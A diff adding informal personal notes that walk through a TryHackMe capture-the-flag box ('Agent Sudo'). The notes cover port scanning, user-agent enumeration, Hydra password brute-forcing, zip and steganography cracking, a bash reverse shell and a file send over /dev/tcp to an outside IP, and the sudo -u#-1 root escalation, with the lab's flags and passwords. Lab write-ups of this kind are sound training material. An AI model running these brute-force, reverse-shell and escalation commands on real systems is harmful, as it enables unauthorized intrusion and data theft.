@@ -1,0 +1,278 @@
+10.10.93.161
+this is the ip whaich we have been provided and now we have to find the flags
+first thing is the nmap scan 
+nmap 10.10.93.161 -F -vv
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 08:42 EDT
+Initiating Ping Scan at 08:42
+Scanning 10.10.93.161 [2 ports]
+Completed Ping Scan at 08:42, 0.25s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 08:42
+Completed Parallel DNS resolution of 1 host. at 08:42, 0.03s elapsed
+Initiating Connect Scan at 08:42
+Scanning 10.10.93.161 [100 ports]
+Discovered open port 22/tcp on 10.10.93.161
+Discovered open port 21/tcp on 10.10.93.161
+Discovered open port 80/tcp on 10.10.93.161
+Completed Connect Scan at 08:42, 2.83s elapsed (100 total ports)
+Nmap scan report for 10.10.93.161
+Host is up, received syn-ack (0.34s latency).
+Scanned at 2020-05-04 08:42:25 EDT for 3s
+Not shown: 97 closed ports
+Reason: 97 conn-refused
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+how many ports are open 
+ans is 3
+
+
+versions in the bettter nmap scan->
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
+
+when we visit the port 80 of the ip we get 
+
+
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R 
+
+somewhat we have to change our useragent to some character like A or B
+so we get this will make a program or script to run this using curl or we can just use burp suite or devloper tools to edit this so for good practice we will be making a bash 
+coudnt make abetter one even afte 15mins
+
+we do this for all and find out that at c we do get the values we needed
+curl -A A 10.10.93.161 
+curl -A B 10.10.93.161
+curl -A C 10.10.93.161 -------------<<<<<
+curl -A D 10.10.93.161
+curl -A E 10.10.93.161
+curl -A F 10.10.93.161
+curl -A G 10.10.93.161
+curl -A H 10.10.93.161
+curl -A I 10.10.93.161
+curl -A J 10.10.93.161
+curl -A K 10.10.93.161
+curl -A L 10.10.93.161
+curl -A M 10.10.93.161
+curl -A N 10.10.93.161
+curl -A O 10.10.93.161
+curl -A P 10.10.93.161
+curl -A Q 10.10.93.161
+curl -A R 10.10.93.161
+curl -A S 10.10.93.161
+curl -A T 10.10.93.161
+curl -A U 10.10.93.161
+curl -A V 10.10.93.161
+curl -A W 10.10.93.161
+curl -A X 10.10.93.161
+curl -A Y 10.10.93.161
+curl -A Z 10.10.93.161
+
+we are redirected to this----->
+http://10.10.93.161/agent_C_attention.php
+
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R 
+
+now we have found the username of the person and also that the password is easy to crack thus we will be using hydra to crack the password:
+
+NOw in the task 3 we are supposed to find 5 things
+
+
+#1 FTP password
+
+as we already know abou the username so we try for chris and we use hydra command:
+hydra -l chris -P /home/kali/Dictionaries/rockyou.txt ftp://10.10.93.161
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-04 09:22:41
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.10.93.161:21/
+
+[21][ftp] host: 10.10.93.161   login: chris   password: crystal
+[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 15 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-04 09:24:02
+
+and we get the password as crystal
+
+
+now for this we will then get the file from logging in ftp by
+ftp <ip>
+ftp 10.10.93.161
+
+input the name as chris and password as crystal
+and then we get all the files
+
+
+we are only allowed to get 3 files?
+ive saved them in the dir and now we have to use them
+
+we have been told that 
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+
+now we have to get the data from the images so we will use steghide
+
+
+for this we have installed stegcracker which is kept in /opt and can be run
+#2 	Zip file password
+
+first we have to file and for loacting zip filw we try to binwalk from the user images and then we find that the cutie.png has a zip file as well.
+
+we will use binwalk
+binwalk -e cutie.png 
+
+-e is for extract and we get the 
+zip file
+/usr/sbin/zip2john
+
+sudo john zip.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+alien            (8702.zip/To_agentR.txt)
+1g 0:00:00:05 DONE 2/3 (2020-05-04 10:19) 0.1757g/s 7730p/s 7730c/s 7730C/s 123456..Peter
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+7z e 8702.zip 
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i3-7020U CPU @ 2.30GHz (806EA),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 280 bytes (1 KiB)
+
+Extracting archive: 8702.zip
+--
+Path = 8702.zip
+Type = zip
+Physical Size = 280
+
+    
+Would you like to replace the existing file:
+  Path:     ./To_agentR.txt
+  Size:     0 bytes
+  Modified: 2019-10-29 08:29:11
+with the file from archive:
+  Path:     To_agentR.txt
+  Size:     86 bytes (1 KiB)
+  Modified: 2019-10-29 08:29:11
+? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y
+
+                    
+Enter password (will not be echoed):
+Everything is Ok    
+
+Size:       86
+Compressed: 280
+
+now we have the To_agentR.txt
+
+cat To_agentR.txt 
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+#3 	steg password
+
+now we will convert the file from bse64
+Area51
+this is the setg file password 
+steghide extract -sf cute-alien.jpg 
+Enter passphrase: Area51
+wrote extracted data to "message.txt".
+
+now we will cat the message file
+
+
+#4 	Who is the other agent (in full name)?
+
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+
+
+#5 	SSH password
+hackerrules!
+
+
+#1 What is the user flag?
+cat user_flag.txt 
+b03d975e8c92a7c04146cfa7a5a313c7
+
+
+export RHOST=10.9.25.132
+export RPORT=12345
+bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+
+
+#2 	What is the incident of the photo called?
+
+export RHOST=10.9.25.132
+export RPORT=12345
+export LFILE=Alien_autospy.jpg
+bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
+just to download the p=uimage and then we put it to google it and find the answer 
+
+Roswell Alien Autopsy
+
+
+
+
+
+now we have to privesc and we will get teh falg 
+the command used by us is
+sudo -u#-1 /bin/bash
+
+
+and we get the root
+
+
+root@agent-sudo:/root# ls
+root.txt
+root@agent-sudo:/root# cat root.txt 
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+
+
+
+
